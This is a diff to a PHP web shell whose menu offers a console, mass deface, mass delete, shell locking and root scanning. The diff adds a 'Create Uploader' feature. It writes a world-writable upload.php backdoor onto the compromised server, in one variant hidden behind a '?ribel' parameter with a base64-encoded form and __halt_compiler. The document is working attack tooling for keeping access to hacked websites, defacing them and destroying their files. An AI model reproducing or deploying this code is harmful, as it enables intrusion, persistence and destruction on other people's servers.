@@ -410,15 +410,15 @@ $Array = [
 				<div class='text-center'>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass deface</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=delete'><i class='bi bi-trash'></i> Mass delete</a>
 			</div>
 			<div class='btn-group'>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=network'><i class='bi bi-hdd-network'></i> Network</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
@@ -429,8 +429,8 @@ $Array = [
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=searchbyEXT'><i class='bi bi-braces'></i> Search By EXT</a>
 			</div><br><br>
 			<div class='btn-group'>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createhates'><i class='bi bi-file-earmark-plus'></i> Create Htaccess</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createuploader'><i class='bi bi-file-earmark-plus'></i> Create Uploader</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_file'><i class='bi bi-file-earmark'></i> Green All File</a>
@@ -439,6 +439,9 @@ $Array = [
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_file'><i class='bi bi-file-earmark-lock'></i> Lock All File</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-folder-x'></i> Lock All Folders</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
@@ -1434,6 +1437,75 @@ Allow from all
 				</div>
 			</form>
 		</div>";
+		}
+		//Create Uploader
+		if ($_7['id'] == 'createuploader') {
+			s();
+			if (isset($_7['bikin'])) {
+				$selectedContent = isset($_7['content']) ? $_7['content'] : '';
+				$isiFile = '';
+				if ($selectedContent == 'content1') {
+					$isiFile = '<?php 
+						ini_set("upload_max_filesize", "100M"); 
+						ini_set("post_max_size", "100M"); 
+						$status = "Error Masse"; 
+						$cwd = getcwd(); 
+						$leader = $_FILES["ribel"]["size"]; 
+						$imam = $_FILES["ribel"]["type"]; 
+						$ribel = $_FILES["ribel"]["name"]; 
+						$status = ""; 
+						if ($ribel != "") { 
+							$cyber = $ribel; 
+							if (copy($_FILES["ribel"]["tmp_name"], $cyber)) { 	
+								$status = "File Berhasil Diupload Masse: <br>" . $cwd . "/" . $ribel; 
+							} else { 	
+								$status = "Terjadi Kesalahan Saat Mengupload File Masse"; 	
+							} 
+						} else { 	
+							$status = "Silahkan Pilih Filenya Dulu Masse"; 
+						} 
+						echo $status; 
+					?><html>
+					<head>
+					</head>
+					<body>
+					<form action="" method="POST" enctype="multipart/form-data">
+					<input type="file" name="ribel">
+					<input type="submit" name="submit" value="Gass Masse">
+					</form>
+					</body>
+					</html>';
+				} elseif ($selectedContent == 'content2') {
+					$isiFile = '<?php 
+						if(isset($_GET["ribel"])) { 
+							echo(base64_decode("PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZSduYW1lPSdmJyAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSd1cCcgLz48L2Zvcm0+")); 
+							@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); 
+							echo("<a href=".$_FILES["f"]["name"].">".$_FILES["f"]["name"]."</a>"); 
+						} 
+						__halt_compiler(); 
+					?>';
+				}
+				$setNama = 'upload.php';
+				$result = file_put_contents($setNama, $isiFile);
+				
+				if ($result !== false) {
+					chmod($setNama, 0777);
+					echo '<strong>Create file</strong> ok! <a href="' . $setNama . '?ribel">Click Here!</a> ' . ok() . '</div>';
+				} else {
+					echo '<strong>Create file</strong> fail! ' . er() . '</div>';
+				}
+			}
+			echo '<div class="mb-3">
+				<u>Create Uploader</u>
+				<form method="POST" id="defenseShellForm">
+					<input type="hidden" name="createhates" value="1">
+					<div class="d-grid gap-2">
+						<label><input type="radio" name="content" value="content1" checked onclick="toggleShellNameInput(false)"> Uploader Anti Delete</label>
+						<label><input type="radio" name="content" value="content2" onclick="toggleShellNameInput(true)"> Normal Uploader pass: ?ribel</label>
+						<input class="btn btn-outline-light btn-sm" type="submit" name="bikin" value="create">
+					</div>
+				</form>
+			</div>';
 		}
 		// Upload Via Link
 		if ($_7['id'] == 'uploadvialink') {
